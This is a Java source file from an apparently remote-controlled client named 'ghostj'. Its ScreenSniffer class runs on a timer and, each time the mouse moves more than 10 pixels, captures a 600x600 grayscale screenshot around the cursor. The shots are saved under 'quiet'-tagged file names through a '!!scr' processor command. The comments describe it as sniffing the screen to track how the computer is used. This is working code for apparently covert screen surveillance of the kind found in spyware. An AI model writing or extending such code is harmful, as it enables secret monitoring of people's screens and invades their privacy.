package com.ghostj.client.core;

import com.ghostj.client.util.PrtScreen;
import com.ghostj.util.TimeUtil;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Date;
import java.util.TimerTask;

/**
 * 嗅探屏幕内容，判断客户端电脑使用情况
 */
public class ScreenSniffer extends TimerTask {
    public ScreenSniffer(){
        //检查暂存文件夹
        File tempDir=new File("scrSnf");
        if (!tempDir.isDirectory()){
            tempDir.mkdir();
        }
    }
    Point lsMouse=new Point(0,0);
    String lsFN="";
    @Override
    public void run() {
        try {
            Point msPoint = MouseInfo.getPointerInfo().getLocation();
            if (Math.sqrt(Math.pow(lsMouse.x - msPoint.x, 2) + Math.pow(lsMouse.y - msPoint.y, 2)) > 10.0) {
//                new File(lsFN).delete();
                //检查暂存文件夹
                File tempDir = new File("scrSnf");
                if (!tempDir.isDirectory()) {
                    tempDir.mkdir();
                }
                String fileName = "scrSnf\\scrSnf-quiet-" + TimeUtil.millsToFileNameValidMMDDHHmmSS(new Date().getTime()) + ".png";
                try {
//                PrtScreen.saveScreen(1, 1, fileName, new Dimension(600, 600), new Point(msPoint.x - 300, msPoint.y - 300),BufferedImage.TYPE_USHORT_GRAY);
                    ClientMain.processor.run("!!scr " + fileName + " 1 1 600 600 " + (msPoint.x - 300) + " " + (msPoint.y - 300) + " " + BufferedImage.TYPE_USHORT_GRAY);

                    //删除文件
                    lsFN = fileName;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            lsMouse = msPoint;
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
